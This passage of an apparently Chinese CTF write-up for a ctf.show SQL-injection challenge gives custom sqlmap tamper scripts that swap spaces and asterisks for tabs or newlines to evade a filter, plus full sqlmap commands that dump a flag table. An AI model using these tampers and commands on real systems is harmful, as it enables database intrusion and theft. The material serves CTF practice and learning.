-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;span class="lnt">33
-&lt;/span>&lt;span class="lnt">34
-&lt;/span>&lt;span class="lnt">35
-&lt;/span>&lt;span class="lnt">36
-&lt;/span>&lt;span class="lnt">37
-&lt;/span>&lt;span class="lnt">38
-&lt;/span>&lt;span class="lnt">39
-&lt;/span>&lt;span class="lnt">40
-&lt;/span>&lt;span class="lnt">41
-&lt;/span>&lt;span class="lnt">42
-&lt;/span>&lt;span class="lnt">43
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.compat&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">xrange&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LOW&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">doublequote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">firstspace&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isspace&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">True&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x09&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">doublequote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x09&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>命名为&lt;code>space2tab.py&lt;/code>，再写个把&lt;code>*&lt;/code>替换为换行的tamper，命名为&lt;code>asterisk2newline.py&lt;/code>，说实话想不到更好的处理方式了，有更好的处理方式的师傅，欢迎评论区讨论，&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;span class="lnt">33
-&lt;/span>&lt;span class="lnt">34
-&lt;/span>&lt;span class="lnt">35
-&lt;/span>&lt;span class="lnt">36
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.compat&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">xrange&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LOW&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">doublequote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">doublequote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>细节点就是需要使用&lt;code>chr(0xxx)&lt;/code>的样式来替换字符，不能直接随便写&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://05c26fc5-ce78-49b1-af86-aa57f63f7352.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://05c26fc5-ce78-49b1-af86-aa57f63f7352.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=igqfvdb6q8776gjl2kj45d5dre&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2tab,asterisk2newline,equaltolike,randomcase&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://05c26fc5-ce78-49b1-af86-aa57f63f7352.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://05c26fc5-ce78-49b1-af86-aa57f63f7352.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=igqfvdb6q8776gjl2kj45d5dre&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2tab,asterisk2newline,equaltolike,randomcase&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flav --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>也可以直接用换行把这&lt;code>*&lt;/code>和空格都过滤的tamper&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;span class="lnt">33
-&lt;/span>&lt;span class="lnt">34
-&lt;/span>&lt;span class="lnt">35
-&lt;/span>&lt;span class="lnt">36
-&lt;/span>&lt;span class="lnt">37
-&lt;/span>&lt;span class="lnt">38
-&lt;/span>&lt;span class="lnt">39
-&lt;/span>&lt;span class="lnt">40
-&lt;/span>&lt;span class="lnt">41
-&lt;/span>&lt;span class="lnt">42
-&lt;/span>&lt;span class="lnt">43
-&lt;/span>&lt;span class="lnt">44
-&lt;/span>&lt;span class="lnt">45
-&lt;/span>&lt;span class="lnt">46
-&lt;/span>&lt;span class="lnt">47
-&lt;/span>&lt;span class="lnt">48
-&lt;/span>&lt;span class="lnt">49
-&lt;/span>&lt;span class="lnt">50
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.compat&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">xrange&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LOW&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">doublequote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">firstspace&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isspace&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">True&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
